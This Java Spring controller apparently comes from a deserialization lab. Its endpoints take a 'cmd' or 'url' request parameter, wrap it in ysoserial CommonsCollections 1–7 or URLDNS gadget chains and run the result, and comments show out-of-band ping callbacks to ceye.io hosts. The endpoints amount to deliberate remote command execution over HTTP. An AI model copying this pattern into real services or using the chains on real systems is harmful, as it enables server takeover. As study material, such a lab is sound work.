package com.hachp1.deser.controller;

import com.hachp1.deser.util.SerialUtil;
import com.hachp1.deser.ysoserial.*;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class IndexController {

    @RequestMapping("/1")
    String cc1(@RequestParam("cmd") String cmd) throws Exception {
        Object object = CC1.getObject(cmd); //"ping cc1.xxx.ceye.io"
        SerialUtil.runPayload(object);
        return "CC1";
    }


    @RequestMapping("/test")
    String cc_test(@RequestParam("cmd") String cmd) throws Exception {
        Object object = TestCC.getObject(cmd);//"ping test_cc1.xxx.ceye.io"
        SerialUtil.runPayload(object);
        return "test_cc1";
    }

    @RequestMapping("/2")
    String cc2(@RequestParam("cmd") String cmd) throws Exception {
        Object object = CC2.getObject(cmd); //"java.lang.Runtime.getRuntime().exec(\"ping cc2.xxx.ceye.io\");"
        SerialUtil.runPayload(object);
        return "CC2";
    }

    @RequestMapping("/3")
    String cc3(@RequestParam("cmd") String cmd) throws Exception {
        Object object = CC3.getObject(cmd);//"java.lang.Runtime.getRuntime().exec(\"ping cc3.xxx.ceye.io\");"
        SerialUtil.runPayload(object);
        return "CC3";
    }


    @RequestMapping("/4")
    String cc4(@RequestParam("cmd") String cmd) throws Exception {
        Object object = CC4.getObject(cmd); //"java.lang.Runtime.getRuntime().exec(\"ping cc4.xxx.ceye.io\");"
        SerialUtil.runPayload(object);
        return "CC4";
    }

    @RequestMapping("/5")
    String cc5(@RequestParam("cmd") String cmd) throws Exception {
        Object object = CC5.getObject(cmd); //"ping cc5.xxx.ceye.io"
        SerialUtil.runPayload(object);
        return "CC5";
    }

    @RequestMapping("/6")
    String cc6(@RequestParam("cmd") String cmd) throws Exception {
        Object object = CC6.getObject(cmd); //"ping cc6.xxx.ceye.io"
        SerialUtil.runPayload(object);
        return "CC6";
    }

    @RequestMapping("/7")
    String cc7(@RequestParam("cmd") String cmd) throws Exception {
        Object object = CC7.getObject(cmd);//"ping cc7.xxx.ceye.io"
        SerialUtil.runPayload(object);
        return "CC7";
    }

    @RequestMapping("/8")
    String urldns(@RequestParam("url") String url) throws Exception {
        Object object = URLDNS.getObject(url); //"http://urldns.xxx.ceye.io"
        SerialUtil.runPayload(object);
        return "URLDNS";
    }
}

